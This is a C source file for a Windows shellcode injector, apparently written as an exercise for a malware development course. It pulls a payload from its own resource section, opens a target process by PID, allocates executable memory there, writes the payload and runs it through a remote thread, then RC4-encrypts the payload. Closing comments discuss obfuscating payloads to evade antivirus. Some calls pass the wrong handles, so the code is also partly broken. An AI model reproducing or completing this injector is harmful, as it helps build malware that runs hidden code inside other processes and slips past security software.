#include <windows.h>
#include <stdio.h>
#include "resource.h"
// constant characters used throughout the output stages
const char* k = "[+}"; // (k) success
const char* i = "[*}"; // (i)informational
const char* e = "[-}"; // (e)error

// so the PID variable has been initialised so far with a value of 0, but later it will have a true value.
LPVOID rBuffer = NULL;
DWORD PID, TID = NULL;
HANDLE hProcess = NULL, hThread = NULL;

// this is for finding the resource 
HRSRC		hRsrc = NULL;
HGLOBAL		hGlobal = NULL;
PVOID		pPayloadAddress = NULL;
SIZE_T		sPayloadSize = NULL;

// Struct definition for Unicode strings
typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING;

// Typedef for the NTAPI function SystemFunction033
typedef NTSTATUS(NTAPI* fnSystemFunction033)(
	struct USTRING* Data,
	struct USTRING* Key
	);


BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);


// Function prototype for RC4 encryption
BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);

/*unsigned char Yenn[] = "\x41\x41\x41\x41\x41\x41\x41\x41"*/

// PID is the process identifier, for each running process on a system.

/*
so int argc is the argument count which counts how many
command line arguments are passed into the program
and argv is the array of pointers(Strings, [0,1,2])
*/;

int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("%s usage: program.exe <PID>", e);
		return EXIT_FAILURE;
	}



	/*
	this here is taking the first command line argument
	and converting the PID from a String into an interger
	using the atoi function then stores it inside of PID
	*/

	PID = atoi(argv[1]);
	printf("%s trying to open a handle to process (%ld)", i, PID);
	// %ld is formatting a double word in decimal format

	// this will now find the payload inside the resource 
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// in case of function failure 
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		// in case of function failure 
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}


	// by adding this to the buffer we can now edit the payload, allowing for encryption and decryption. 
	PVOID	pTmpBuffer = HeapAlloc(GetProcessHeap(), 0, sPayloadSize);
	if (pTmpBuffer != NULL) {
		memcpy(pTmpBuffer, pPayloadAddress, sPayloadSize);
	}


	
		

	/* open a handle to the process */

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		PID);
	printf("%s got a handle to the  process!\n\\---0x%p", k, hProcess);
	if (hProcess == NULL) {
		printf("%s couldnt get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	rBuffer = VirtualAllocEx(hGlobal, NULL, sPayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with rwx permissions", k, sPayloadSize);

	/* now i need to write the proccess memory, now thats it can be allocated into a process using the rBuffer function above */

	WriteProcessMemory(hProcess, rBuffer, hGlobal, sPayloadSize, NULL);
	printf("%s wrote %zu-bytes to process memory\n", k, sPayloadSize);

	/* create thread to run my payload now that memory has been written payload */


	hThread = CreateRemoteThreadEx(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		0,
		&TID);

	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	// this retrives the username of the current user. this is my task from maldev academy in module 7 

	char username[MAX_PATH];
	DWORD username_len = MAX_PATH;
	if (GetUserNameA(username, &username_len)) {
		printf("%s is the current Username: %s\n", k, username);
	}
	else {
		printf("%s failed to get the UserName. Error code: %d\n", e, GetLastError());
	}
	

	printf("%s got a handle to the thread (%ld)\n\\---0x%p", k, TID, hThread);

	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread has finished executing\n", k);
	printf("[i] pPayloadAddress var : 0x%p \n", pPayloadAddress);
	printf("[i] sPayloadSize var : %ld \n", sPayloadSize);
	printf("%s pTmpBuffer var : 0x%p \n", i,pTmpBuffer);
	// Print the original payload contents
	printf("%s Original Payload contents : \n", i);
	for (size_t i = 0; i < sPayloadSize; i++) {
		printf("%02X ", ((BYTE*)pTmpBuffer)[i]); // Print each byte in hexadecimal format
	}
	printf("\n");

	// Encrypt the payload
	// Assuming pRc4Key is your RC4 encryption key / please change this key when injecting
	BYTE pRc4Key[] = "YourRC4KeyHere";
	BOOL success = Rc4EncryptionViSystemFunc033(pRc4Key, (PBYTE)pTmpBuffer, sizeof(pRc4Key) - 1, sPayloadSize);
	if (!success) {
		printf("%s Payload encryption failed\n", e);
		return EXIT_FAILURE;
	}

	// Print the encrypted payload contents
	printf("%s Encrypted Payload contents : \n", i);
	for (size_t i = 0; i < sPayloadSize; i++) {
		printf("%02X ", ((BYTE*)pTmpBuffer)[i]); // Print each byte in hexadecimal format
	}
	printf("\n");
	printf("%s cleaning up\n", i);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	printf("%s finished, all handles closed!\n", k);
	printf("[#] Press <Enter> To Quit ...");
	printf("if your compiling this code now please wait for the update of the decrypter!: ");



	return EXIT_SUCCESS;
}


BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
	NTSTATUS	STATUS = NULL;

	// Define the Key and Data structures
	USTRING	Key = {
		.Buffer = pRc4Key,
		.Length = dwRc4KeySize,
		.MaximumLength = dwRc4KeySize
	};

	USTRING	Data = {
		.Buffer = pPayloadData,
		.Length = sPayloadSize,
		.MaximumLength = sPayloadSize
	};

	// Load the SystemFunction033 function dynamically
	fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction033");

	// Call the SystemFunction033 for RC4 encryption
	if ((STATUS = SystemFunction033(&Data, &Key)) != 0x0) {
		printf("[!] SystemFunction033 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}




/*
	- pShellcode : Base address of the payload to encrypt
	- sShellcodeSize : The size of the payload
	- bKey : A single arbitrary byte representing the key for encrypting the payload
*/





/*
using a heavily signartured payload will most likely be picked up
by every anit-virus software.

using obfuscation techniques such as RC4 encrption, XOR and AES. can higher
the chances of evasion. also naming techiques and code structure.Also using the NT-api too which i am yet to focus on. 


using the decryption function i need to add this in so that it can read the payload contents
of the buffer. this should hopefully fix the payload error

also i need to update this again especially by doing the encryption process seperately then brining in the decrypted payload to 
this injection program. 
*/